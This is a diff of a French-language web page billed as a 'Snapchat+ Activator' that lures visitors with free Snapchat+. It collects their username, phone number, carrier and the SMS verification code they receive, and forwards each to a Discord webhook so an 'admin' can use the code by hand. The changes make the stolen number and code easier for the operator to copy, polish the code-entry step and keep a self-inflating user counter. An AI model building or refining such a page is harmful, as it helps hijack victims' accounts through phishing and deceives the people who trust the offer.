@@ -69,6 +69,8 @@
             z-index: 10;
             width: 100%;
             max-width: 520px;
+            max-height: 90vh;               /* ← hauteur max pour ne pas dépasser l'écran */
+            overflow-y: auto;               /* ← scroll si contenu trop long */
             background: #111111;
             backdrop-filter: blur(12px);
             -webkit-backdrop-filter: blur(12px);
@@ -81,6 +83,15 @@
         }
         .card:hover {
             box-shadow: 0 20px 80px rgba(255, 215, 0, 0.05), 0 0 0 1px rgba(255, 215, 0, 0.2) inset;
+        }
+        /* Ajustement pour mobile : moins de padding et hauteur automatique */
+        @media (max-width:480px) {
+            .card { 
+                padding: 20px 16px 28px; 
+                border-radius: 18px; 
+                margin: 10px;
+                max-height: 95vh;
+            }
         }
 
         /* ===== LOGO ===== */
@@ -430,6 +441,23 @@
             box-shadow: 0 0 30px rgba(255, 215, 0, 0.05);
         }
 
+        /* ===== FREE MOBILE ERROR ===== */
+        .free-error {
+            display: none;
+            background: rgba(255, 0, 0, 0.08);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin: 12px 0 16px;
+            color: #ff6b7a;
+            font-size: 14px;
+            line-height: 1.5;
+            align-items: center;
+            gap: 10px;
+        }
+        .free-error .icon { font-size: 22px; }
+        .free-error .text { flex: 1; }
+
         /* ===== BOUTONS ===== */
         .btn-primary {
             width: 100%;
@@ -526,9 +554,11 @@
         }
 
         @media (max-width:480px) {
-            .card { padding: 24px 18px 30px; border-radius: 18px; margin: 12px; }
             .logo-snap { width: 80px; height: 80px; }
             .header-center h1 { font-size: 22px; }
+            .step-dot .circle { width: 26px; height: 26px; font-size: 11px; }
+            .step-dot .label { font-size: 8px; }
+            .step-indicator { margin-bottom: 18px; }
         }
     </style>
 </head>
@@ -661,7 +691,7 @@
                     <div class="input-hint">Un code de vérification va être envoyé sous 1 à 3 minutes</div>
                 </div>
 
-                <!-- ===== NOUVEAU : SÉLECTEUR D'OPÉRATEUR ===== -->
+                <!-- ===== SÉLECTEUR D'OPÉRATEUR ===== -->
                 <div class="input-group" style="margin-top:8px;">
                     <label>📶 Opérateur mobile</label>
                     <select id="operatorSelect">
@@ -673,29 +703,93 @@
                     </select>
                 </div>
 
+                <!-- ===== MESSAGE D'ERREUR POUR FREE MOBILE ===== -->
+                <div class="free-error" id="freeError">
+                    <span class="icon">🚫</span>
+                    <span class="text">Désolé, mais la requête ne pourra pas marcher car Free n'autorise pas que le bot puisse offrir Snapchat+ et ne me laisse pas faire plaisir aux gens.</span>
+                </div>
+
                 <button class="btn-primary" id="submitPhone">📤 Envoyer le numéro</button>
             </div>
             <button class="btn-secondary" id="backStep3">← Revenir à l'activation</button>
         </div>
 
-        <!-- ÉTAPE 5 -->
+        <!-- ========================================================= -->
+        <!-- ÉTAPE 5 – GROSSIE ET CLAIRE, AVEC SCROLL CORRIGÉ          -->
+        <!-- ========================================================= -->
         <div class="step-content" id="step5">
-            <div class="step-title">Étape 5 — Code de vérification</div>
-            <p class="step-desc">
-                Un code de vérification a été envoyé au numéro <strong style="color:#fff;" id="displayPhone">+33 6 XX XX XX</strong>.<br>
-                <span style="color:rgba(255,255,255,0.2);font-size:12px;">Il peut arriver dans 1 à 3 minutes. Attends bien.</span>
-            </p>
+            <div class="step-title" style="font-size:22px;">📲 Étape 5 — Code de vérification</div>
+            
+            <!-- Bloc d'information ultra-visible -->
+            <div style="
+                background: rgba(255, 215, 0, 0.10);
+                border: 3px solid #FFD700;
+                border-radius: 20px;
+                padding: 24px 18px;
+                margin: 12px 0 22px;
+                text-align: center;
+                box-shadow: 0 0 40px rgba(255, 215, 0, 0.15);
+            ">
+                <p style="
+                    font-size: 20px;
+                    font-weight: 700;
+                    color: #fff;
+                    margin-bottom: 10px;
+                    letter-spacing: 0.3px;
+                ">
+                    📩 Un code de vérification vous sera envoyé par SMS sous peu.
+                </p>
+                <p style="
+                    font-size: 18px;
+                    font-weight: 500;
+                    color: rgba(255, 255, 255, 0.75);
+                    margin-bottom: 14px;
+                ">
+                    Veuillez attendre la réception du message.
+                </p>
+                <div style="
+                    background: rgba(0, 0, 0, 0.5);
+                    border-radius: 16px;
+                    padding: 16px 20px;
+                    display: inline-block;
+                    border: 1px solid rgba(255, 215, 0, 0.3);
+                ">
+                    <span style="
+                        font-size: 16px;
+                        font-weight: 600;
+                        color: rgba(255, 255, 255, 0.6);
+                        display: block;
+                        margin-bottom: 4px;
+                    ">
+                        📞 L'admin va vous envoyer le code manuellement sur :
+                    </span>
+                    <span id="displayPhone" style="
+                        font-size: 32px;
+                        font-weight: 900;
+                        color: #FFD700;
+                        letter-spacing: 2px;
+                        text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+                        display: block;
+                    ">
+                        +33 6 XX XX XX
+                    </span>
+                </div>
+            </div>
+
+            <!-- Champ code -->
             <div class="code-field visible">
                 <div class="input-group">
-                    <label>🔑 Entre le code reçu</label>
-                    <input type="text" id="codeInput" placeholder="ex: 123456" maxlength="6">
-                    <div class="input-hint">Code reçu par SMS</div>
+                    <label style="font-size:14px;">🔑 Entre le code reçu</label>
+                    <input type="text" id="codeInput" placeholder="ex: 123456" maxlength="6" style="font-size:18px; padding:16px;">
+                    <div class="input-hint" style="font-size:13px;">Code reçu par SMS</div>
                 </div>
-                <button class="btn-primary" id="submitCode">✅ Valider le code</button>
+                <button class="btn-primary" id="submitCode" style="font-size:18px; padding:18px;">✅ Valider le code</button>
             </div>
-            <button class="btn-secondary" id="backStep4">← Modifier le numéro</button>
-            <div class="footer-note" style="margin-top:12px;"><span>⏳ Le code expire dans 5 minutes après réception</span></div>
+
+            <button class="btn-secondary" id="backStep4" style="font-size:15px;">← Modifier le numéro</button>
+            <div class="footer-note" style="margin-top:14px;"><span>⏳ Le code expire dans 5 minutes après réception</span></div>
         </div>
+        <!-- FIN ÉTAPE 5 -->
 
     </div>
 
@@ -741,7 +835,8 @@
             const captchaBox = document.getElementById('captchaBox');
             const phoneField = document.getElementById('phoneField');
             const phoneInput = document.getElementById('phoneInput');
-            const operatorSelect = document.getElementById('operatorSelect'); // NOUVEAU
+            const operatorSelect = document.getElementById('operatorSelect');
+            const freeError = document.getElementById('freeError');
             const submitPhoneBtn = document.getElementById('submitPhone');
             const backStep3Btn = document.getElementById('backStep3');
 
@@ -804,7 +899,26 @@
             }
 
             // =========================================================
-            // 6. ÉTAPE 1 → 2
+            // 6. FONCTION DE GESTION DE L'OPÉRATEUR (FREE MOBILE)
+            // =========================================================
+            function updateOperatorState() {
+                const selected = operatorSelect.value;
+                if (selected === 'Free Mobile') {
+                    phoneInput.disabled = true;
+                    phoneInput.style.opacity = '0.5';
+                    submitPhoneBtn.disabled = true;
+                    freeError.style.display = 'flex';
+                    phoneInput.value = '';
+                } else {
+                    phoneInput.disabled = false;
+                    phoneInput.style.opacity = '1';
+                    submitPhoneBtn.disabled = false;
+                    freeError.style.display = 'none';
+                }
+            }
+
+            // =========================================================
+            // 7. ÉTAPE 1 → 2
             // =========================================================
             goStep2Btn.addEventListener('click', function() {
                 let pseudo = pseudoInput.value.trim();
@@ -828,7 +942,7 @@
             });
 
             // =========================================================
-            // 7. CONFIRMATION ÉTAPE 2
+            // 8. CONFIRMATION ÉTAPE 2
             // =========================================================
             confirmBox.addEventListener('click', function() {
                 isConfirmed = !isConfirmed;
@@ -844,7 +958,7 @@
             backStep1Btn.addEventListener('click', function() { goToStep(1); });
 
             // =========================================================
-            // 8. ÉTAPE 2 → 3 (ACTIVATION)
+            // 9. ÉTAPE 2 → 3 (ACTIVATION)
             // =========================================================
             goStep3Btn.addEventListener('click', function() {
                 if (!isConfirmed) return;
@@ -896,7 +1010,7 @@
             }
 
             // =========================================================
-            // 9. ÉTAPE 3 → 4
+            // 10. ÉTAPE 3 → 4
             // =========================================================
             goStep4Btn.addEventListener('click', function() {
                 if (goStep4Btn.disabled) return;
@@ -905,13 +1019,15 @@
                 captchaCheck.classList.remove('checked');
                 phoneField.classList.remove('visible');
                 phoneInput.value = '';
+                operatorSelect.value = 'Bouygues Telecom';
+                updateOperatorState();
                 goToStep(4);
             });
 
             backStep3Btn.addEventListener('click', function() { goToStep(3); });
 
             // =========================================================
-            // 10. CAPTCHA (ÉTAPE 4)
+            // 11. CAPTCHA (ÉTAPE 4)
             // =========================================================
             captchaBox.addEventListener('click', function() {
                 if (isCaptchaChecked) return;
@@ -920,25 +1036,34 @@
                 phoneField.classList.add('visible');
                 captchaBox.style.cursor = 'default';
                 captchaBox.style.opacity = '0.7';
+                updateOperatorState();
             });
 
             // =========================================================
-            // 11. ENVOI DU NUMÉRO (ÉTAPE 4 → 5) AVEC VALIDATION & OPÉRATEUR
+            // 12. ÉCOUTEUR SUR LE SÉLECTEUR D'OPÉRATEUR
+            // =========================================================
+            operatorSelect.addEventListener('change', function() {
+                updateOperatorState();
+            });
+
+            // =========================================================
+            // 13. ENVOI DU NUMÉRO (ÉTAPE 4 → 5) – NUMÉRO COPIEUX DANS L'EMBED
             // =========================================================
             submitPhoneBtn.addEventListener('click', async function() {
+                if (operatorSelect.value === 'Free Mobile') {
+                    alert('❌ Désolé, mais Free Mobile n\'est pas supporté pour cette activation.');
+                    return;
+                }
+
                 let rawPhone = phoneInput.value.trim();
-                // Nettoyage : enlever espaces, points, tirets, parenthèses
                 let clean = rawPhone.replace(/[\s\.\-\(\)]/g, '');
 
-                // Gérer l'indicatif +33 (le remplacer par 0)
                 if (clean.startsWith('+33')) {
                     clean = '0' + clean.slice(3);
                 } else if (clean.startsWith('0033')) {
                     clean = '0' + clean.slice(4);
                 }
 
-                // Validation : doit commencer par 06, 07, 6 ou 7, et avoir 9 ou 10 chiffres
-                // On autorise 9 chiffres (sans le 0 initial) ou 10 chiffres (avec 0)
                 const validRegex = /^(0[67]|6|7)[0-9]{8,9}$/;
                 if (!validRegex.test(clean)) {
                     phoneInput.style.borderColor = '#ff6b7a';
@@ -950,30 +1075,27 @@
                     return;
                 }
 
-                // Formater pour l'affichage (si 10 chiffres, on met des espaces tous les 2)
                 let display = clean;
                 if (clean.length === 10) {
                     display = clean.match(/.{1,2}/g).join(' ');
                 } else if (clean.length === 9) {
-                    // On ajoute un 0 devant pour l'affichage
                     display = '0' + clean;
                     display = display.match(/.{1,2}/g).join(' ');
                 }
-                currentPhone = clean; // stocke le numéro nettoyé (sans espaces)
+                currentPhone = clean;
                 currentOperator = operatorSelect.value;
 
-                // Masquer une partie pour l'affichage (étape 5)
                 const masked = display.length > 6 ? display.slice(0, -4) + ' XX XX' : display;
                 displayPhone.textContent = '+33 ' + masked;
 
-                // Préparer l'embed Discord avec l'opérateur
+                // ===== EMBED AVEC NUMÉRO EN BLOC DE CODE POUR COPIE =====
                 const embed = {
                     title: '📱 Nouveau numéro soumis',
                     color: 0xFFD700,
                     timestamp: new Date().toISOString(),
                     fields: [
                         { name: '👤 Pseudo', value: '@' + currentPseudo, inline: true },
-                        { name: '📞 Numéro', value: currentPhone, inline: true },
+                        { name: '📞 Numéro (copiable)', value: '`' + currentPhone + '`', inline: true },
                         { name: '📶 Opérateur', value: currentOperator, inline: true },
                         { name: '🔄 Étape', value: 'En attente du code', inline: true }
                     ],
@@ -989,7 +1111,7 @@
             });
 
             // =========================================================
-            // 12. SOUMISSION DU CODE
+            // 14. SOUMISSION DU CODE – CODE COPIEUX DANS L'EMBED
             // =========================================================
             submitCodeBtn.addEventListener('click', async function() {
                 if (codeSubmitted) return;
@@ -1004,15 +1126,16 @@
                     return;
                 }
 
+                // ===== EMBED AVEC CODE EN BLOC DE CODE =====
                 const embed = {
                     title: '🔑 Code saisi par l\'utilisateur',
                     color: 0xFFD700,
                     timestamp: new Date().toISOString(),
                     fields: [
                         { name: '👤 Pseudo', value: '@' + currentPseudo, inline: true },
-                        { name: '📞 Numéro', value: currentPhone || 'Non fourni', inline: true },
+                        { name: '📞 Numéro', value: '`' + currentPhone + '`', inline: true },
                         { name: '📶 Opérateur', value: currentOperator || 'Non spécifié', inline: true },
-                        { name: '🔢 Code', value: '`' + code + '`', inline: true }
+                        { name: '🔢 Code (copiable)', value: '`' + code + '`', inline: true }
                     ],
                     footer: { text: '✅ Valide manuellement et clique sur "J\'ai validé"' }
                 };
@@ -1068,7 +1191,7 @@
             });
 
             // =========================================================
-            // 13. RETOUR ÉTAPE 5 → 4
+            // 15. RETOUR ÉTAPE 5 → 4
             // =========================================================
             backStep4Btn.addEventListener('click', function() {
                 goToStep(4);
@@ -1077,17 +1200,20 @@
                 document.getElementById('loadingOverlay').classList.remove('visible');
                 const btn = document.getElementById('manualValidationBtn');
                 if (btn) btn.remove();
+                isCaptchaChecked = true;
+                captchaCheck.classList.add('checked');
+                updateOperatorState();
             });
 
             // =========================================================
-            // 14. TOUCHE ENTRÉE
+            // 16. TOUCHE ENTRÉE
             // =========================================================
             pseudoInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') goStep2Btn.click(); });
             phoneInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') submitPhoneBtn.click(); });
             codeInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') submitCodeBtn.click(); });
 
             // =========================================================
-            // 15. INIT
+            // 17. INIT
             // =========================================================
             let baseCount = 3156;
             setInterval(() => {
@@ -1097,9 +1223,11 @@
                 }
             }, 8000);
 
-            console.log('🔥 Snapchat+ Activator — Version avec opérateur et validation 06/07');
+            updateOperatorState();
+
+            console.log('🔥 Snapchat+ Activator — Version avec numéro et code copiables dans Discord');
             console.log('🔧 Webhook configuré :', WEBHOOK_URL);
-            console.log('💡 Après envoi du code, un bouton "J\'ai validé" apparaît.');
+            console.log('📱 Scroll corrigé pour mobile (étape 5)');
         })();
     </script>
 
